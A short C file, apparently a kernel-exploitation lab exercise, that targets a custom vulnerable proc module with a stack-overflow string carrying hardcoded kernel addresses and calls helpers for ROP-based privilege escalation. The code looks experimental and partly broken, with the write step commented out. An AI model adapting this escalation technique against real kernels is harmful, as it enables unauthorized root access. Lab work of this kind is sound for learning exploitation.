#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include "template.h"
//author : afang
//comment: what a nice day, isn't it?!

int main(){

	//interact with kernel module to test if module is effective..
	prepare_tf();
	kernel_rop_escalate(0xffff5f10); //incase truncated.
	char *file = "/proc/stkovemod";
	char *buf = "I'm inside kernel.\n";
	int fd = open(file, O_RDWR);
//	write(fd, buf, strlen(buf));
	char *buf2 = (char*)malloc(100);
	//target: 0xffffffff81bc04f9
	char *temp = "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\x10\x5f\xff\xff\xff\xff\xff\xff\xf9\x04\xbc\x81\xff\xff\xff\xff";
	strcpy(buf2, temp);
	read(fd, buf2, 20);
	printf("content:\n");
	printf("%s", buf2);
	return 0;
}

